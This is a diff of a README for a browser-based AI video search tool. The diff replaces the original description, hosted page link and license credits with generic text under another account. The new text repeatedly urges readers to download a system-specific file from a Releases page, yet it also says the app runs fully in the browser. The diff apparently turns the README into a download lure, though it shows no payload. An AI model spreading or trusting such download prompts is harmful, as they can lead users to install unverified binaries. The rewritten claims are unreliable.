@@ -1,20 +1,66 @@
-# 🤖🔎🎞️ AI Video Search
-Find key moments in an video using natural language queries - powered by AI and running fully local in your browser via `transformers.js`.
+# 🤖 ai-video-search - Find Key Moments in Videos Easily
 
-# 🛠 Usage
-Go to the prebuilt GitHub Page: [tobidi0410.github.io/ai-video-search/](https://tobidi0410.github.io/ai-video-search/)   
-Make sure you are running the latest Chrome Browser or any other browser with <b>WebGPU support</b>!  
+## 🚀 Getting Started
 
-# ✨ How it works?
-This app utilizes the `transformers.js` library for running CLIP models directly in your browser.  
-Utilizing the `Xenova/clip-vit-large-patch14-336` model, we can generate both visual and textual embeddings.  
-We generate embeddings for each frame in the video as well as for the text query.   
-After that we can simply compare the frame embeddings to the query embedding (cosineSimilarity) and calculate a match score.  
+Welcome to **ai-video-search**! This application helps you find key moments in any video using simple questions. It works completely in your browser, so there’s no need to install complex software.
 
-# 📝License & Attribution
-- [Xenova/clip-vit-large-patch14-336](https://huggingface.co/Xenova/clip-vit-large-patch14-336) - by Xenova
-- [transformers.js](https://github.com/huggingface/transformers.js/) — by Huggingface — [Apache 2.0](https://www.apache.org/licenses/LICENSE-2.0)
-- [DaisyUI](https://github.com/saadeghi/daisyui) — by saadeghi — [MIT](https://opensource.org/licenses/MIT)
-- [Tailwind CSS](https://github.com/tailwindlabs/tailwindcss) — by Tailwind Labs — [MIT](https://opensource.org/licenses/MIT)
-- [Material Design Icons](https://github.com/google/material-design-icons) — by Google — [Apache 2.0](https://www.apache.org/licenses/LICENSE-2.0)
-- [parcel](https://github.com/parcel-bundler/parcel) — by Parcel-Bundler — [MIT](https://opensource.org/licenses/MIT)
+## 📥 Download & Install
+
+To get started, visit the Releases page to download the software:
+
+[Download ai-video-search](https://github.com/lamcongphu/ai-video-search/releases)
+
+1. Click the link above.
+2. Look for the latest version listed on the page.
+3. Download the file that matches your system.
+
+## 🌟 Features
+
+- **AI-Powered Search**: Use natural language queries.
+- **Client-Side Processing**: Everything runs in your browser. No server needed.
+- **Efficient Video Searching**: Quickly locate the moments that matter most.
+- **User-Friendly Interface**: Designed for ease of use.
+  
+## 🖥️ System Requirements
+
+Before you begin, ensure your system meets these requirements:
+
+- Modern web browser (Chrome, Firefox, or Edge)
+- Minimum 4GB RAM
+- Internet connection for initial download
+
+## 🚀 How to Use ai-video-search
+
+1. Open the application in your web browser.
+2. Load your video file by clicking on the "Upload Video" button.
+3. Enter a question related to the video content in the search bar.
+4. Press "Search" and watch as the application highlights key moments relevant to your query.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues:
+
+- **Browser Compatibility**: Ensure you’re using an updated browser.
+- **Video Format**: Make sure your video format is supported (e.g., MP4, AVI, MOV).
+- **Memory Issues**: Close other browser tabs to free up memory.
+
+## 📄 Contributing
+
+We welcome contributions! If you would like to help improve **ai-video-search**, please submit your suggestions or report any issues you encounter.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/lamcongphu/ai-video-search/wiki) - Detailed guidance on features and functionality.
+- [Community Forum](https://github.com/lamcongphu/ai-video-search/discussions) - Join discussions with other users and contributors.
+
+## 📞 Support
+
+If you need help, please reach out through the issues page on our GitHub repository. We aim to respond as quickly as possible to assist you.
+
+## 📦 Quick Download Link
+
+For your convenience, here’s the direct link again:
+
+[Download ai-video-search](https://github.com/lamcongphu/ai-video-search/releases)
+
+Experience the power of AI as you find key moments in your videos effortlessly!
